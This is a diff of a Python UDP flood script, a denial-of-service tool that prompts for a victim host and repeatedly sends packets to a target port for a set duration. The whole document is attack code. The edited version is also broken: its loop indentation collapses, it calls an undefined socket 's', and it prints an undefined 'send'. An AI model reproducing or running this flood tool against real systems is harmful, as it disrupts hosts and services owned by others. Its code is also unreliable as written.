@@ -1,4 +1,4 @@
-import socket, sys, os, time, itertools, threading, random
+import socket, sys, os, time, itertools, threading, random, string
 
 try:
 	import console
@@ -23,27 +23,27 @@ socket.setdefaulttimeout(10)
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 daemonslayer = []
 
-def dos(victim,vport,duration,name,strng):
-	bytes = random._urandom(1024) * strng
+def dos(target,port,duration,name,strng):
+	data = random.sample(string.ascii_letters*200,1024) * strng
 	timeout = time.time() + duration
 	sent = 0
 	while 1:
-		if time.time() > timeout:
-			break		
-		else:
-			pass
-		try:
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-			client.sendto(bytes, (victim, vport))
-		except:
-			pass
-		if name in daemonslayer:
-			break
-		sent = sent + 5
-		sys.stdout.write("%s Packets: %s\r\n" %(name, sent))
+	if time.time() > timeout:
+		break		
+	else:
+		pass
+	try:
+		s.sendto(data, (target, port))
+		s.sendto(data, (target, port))
+		s.sendto(data, (target, port))
+		s.sendto(data, (target, port))
+		s.sendto(data, (target, port))
+	except:
+		pass
+	if name in daemonslayer:
+		break
+	sent = sent + 5
+	sys.stdout.write("%s Packets: %s\r\n"%(name, send))
 
 credits()
 victim = raw_input("Host: ")
